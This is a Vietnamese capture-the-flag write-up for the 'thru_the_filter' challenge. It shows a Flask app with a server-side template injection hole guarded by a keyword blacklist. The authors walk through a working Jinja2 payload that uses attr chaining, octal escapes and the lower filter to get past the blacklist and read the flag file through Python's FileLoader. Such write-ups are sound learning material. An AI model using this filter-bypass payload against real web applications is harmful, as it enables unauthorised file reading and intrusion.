# thru_the_filter
**Solver: phulelouch & goldensang**

### 1. Context
Nhìn sơ qua các file nhé
*docker-entrypoint.sh*
```shell
#!/bin/sh

# Generate random flag name
random_flag_name="flag_$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1).txt"

# Specify flag content
flag_content="ISITDTU{test_flag}"

# Move flag file to root directory
echo "$flag_content" > /"$random_flag_name"

# Set permissions for flag file
chmod 744 /"$random_flag_name"

# Get the user
user=$(ls /home)

# Set permissions for /app directory
chmod 740 /app/*

# Change directory and run Flask
cd /app && flask run -h 0.0.0.0 -p 8080
```
*Dockerfile*
```shell
FROM python:3.10-slim-bullseye
LABEL auther_template="khanhhnahk1"


RUN sed -i 's/deb.debian.org/mirrors.ustc.edu.cn/g' /etc/apt/sources.list && \
    sed -i 's/security.debian.org/mirrors.ustc.edu.cn/g' /etc/apt/sources.list
RUN apt-get update 

# install flask
RUN python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple \
    flask

# Copy the source code and startup script to the root directory
COPY ./src/ /app
COPY ./service/docker-entrypoint.sh /

# expose port
EXPOSE 8080
RUN groupadd -r thru_the_filter && useradd -r -g thru_the_filter thru_the_filter
RUN echo "ISITDTU{test_flag}"> /app/flag.txt
RUN chmod 440 /app/flag.txt
RUN chown -R root:thru_the_filter /app


USER thru_the_filter

WORKDIR /app
ENTRYPOINT ["/bin/bash","/docker-entrypoint.sh"]
```
*app.py*
```python
from flask import Flask, request, render_template_string,redirect

app = Flask(__name__)
def check_payload(payload):
    blacklist = ['import', 'request', 'init', '_', 'b', 'lipsum', 'os', 'globals', 'popen', 'mro', 'cycler', 'joiner', 'u','g','args', 'get_flashed_messages', 'base', '[',']','builtins', 'namespace', 'self', 'url_for', 'getitem','.','eval','update','config','read','dict']
    for bl in blacklist:
        if bl in payload:
            print(bl)
            return True
    return False
@app.route("/")
def home():
    if request.args.get('c'):
        ssti=request.args.get('c')
        if(check_payload(ssti)):
            return "HOLD UP !!!"
        else:
            return render_template_string(request.args.get('c'))
    else:
        return redirect("""/?c={{ 7*7 }}""")


if __name__ == "__main__":
    app.run()

```

Nhìn sơ qua app thì ta có thể thấy được, flow chạy của application sẽ như sau:
- Build application với Dockerfile với image là:  python:3.10-slim-bullseye
- Dockerfile sẽ trỏ tới docker-entrypoint.sh
- docker-entrypoint.sh sẽ chạy file app.py dùng Flask.

Observation từ các file docker nói chung:
- những cái màu mè từ phải docker-entrypoint.sh có thể bỏ qua, flag dc lưu ở /app/flag.txt như trong file Dockerfile, chủ yếu là distraction, những cái màu mè ở file docker-entrypoint.sh thì làm mọi ng distract, nếu có RCE thì may ra làm theo hướng exploit cái đó dc :v còn không thì nên focus vô.
- file flag dc set quyền 440, nghĩa là chỉ owner của file với group dc trao quyền mới đọc được, nghĩa là phải exec code từ server-side, và tìm cách đẩy lên browser để mà ae mình lấy flag -> ý tưởng SSTI
- trong lúc làm bài, có ý tưởng làm XSS, nhưng code exec ở phía client-side, nên cũng no-hope.

Phân tích *app.py*:
- Xài Flask, và có một checkpoint check blacklist trong string, chỉ cần match string là fail
- Và blacklist khá gắt, nên phải tìm cách bypass từng cái một
- render_template_string() là nơi có thể exploit nhất, đặc biệt với SSTI, giờ chỉ cần tìm payload phù hợp
- đọc thêm SSTI ở: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

Tóm tắt SSTI ở bài này:
- Cơ chế hoạt động là nó xài Jinja String Template để render HTML, nói nôm na là 1 file template HTML, nó có những syntax để mình bỏ biến vô, nhưng rất hạn chế.
- Payload để prove SSTI work với bài này mà mình với anh Phú xài: `http://34.124.244.195:1338/?c={{7*7}}`
- blacklist block hết các hàm phổ biến, nên phải mò kinh thánh một hồi mới mò ra được các thứ nó work

Cách mình với anh Phú xây dựng payload:
```
http://34.124.244.195:1338/?c={{7*7}}

Dựa trên phần Jinja2 - Filter bypass kinh thánh, thì tụi mình test thử payload này

{{request|attr('application')()}}
Mà nó chặn request rồi, mà tụi nó không chặn string nên payload nó thành như vầy

{{ ''.__class__.__mro__[2].__subclasses__()}}

Nhưng gặp phải blacklist _, [, ] và cả class, sau một hồi mình mò, thì nhận ra là combine 2 tụi nó lại, tụi mình có thể forge payload nó nhin như thế này:
{{'' | attr('asdfsdaf')()}}

Thì nó chuyển về xử lý string hết, và attr() ko bị block
- Để solve _ thì tụi mình có thể convert nó qua %x5f, %X5f, và bí một hồi thì mới nhận ra chuyển qua octa cũng được =)) nên thành \137
- Có được insights này thì tụi mình nhận ra là convert những ký đặc biệt bị block qua octa, và những từ bị block thành dạng 'ABC' | lower (này search chatgpt với google ra dc syntax của Jinja, syntax tụi nó vậy)

'ABC' | lower => 'abc'
'\137' => '_' 
Rồi với những insights này thì việc còn lại là dò theo payload, convert nó qua định dạng không bị block, ban đầu tụi mình thử exploits hàm Popen, mà nó bủh quá, anh Phú tìm 1 hồi ra được cái hàm FileLoader trong hệ thống của python

Payload:
http://34.124.244.195:1338/?c={{''|
attr('\137\137CLASS\137\137'|lower)|
attr('\137\137MRO\137\137'|lower)|
last|
attr('\137\137SUBCLASSES\137\137'%20|%20lower()|
attr('\137\137GETITEM\137\137'%20|%20lower)(118)("/APP/FLAG\056TXT","/APP/FLAG\056TXT")|
attr('GET\137DATA'%20|%20lower)("/APP/FLAG\056TXT"|lower)}}

Tóm tắt cơ chế hoạt động, thì python nó có chỗ lưu các biến, hàm global hoặc ngoài context của class, cái này mọi người đọc.
Thì mò một hồi, ra được cái hàm này :v đấm phát ăn luôn flag
b'ISITDTU{tough_times_create_tough_guys!@@%#0@}\n'
```

But faster: https://github.com/Marven11/Fenjing :(
reference: https://ctftime.org/writeup/17686
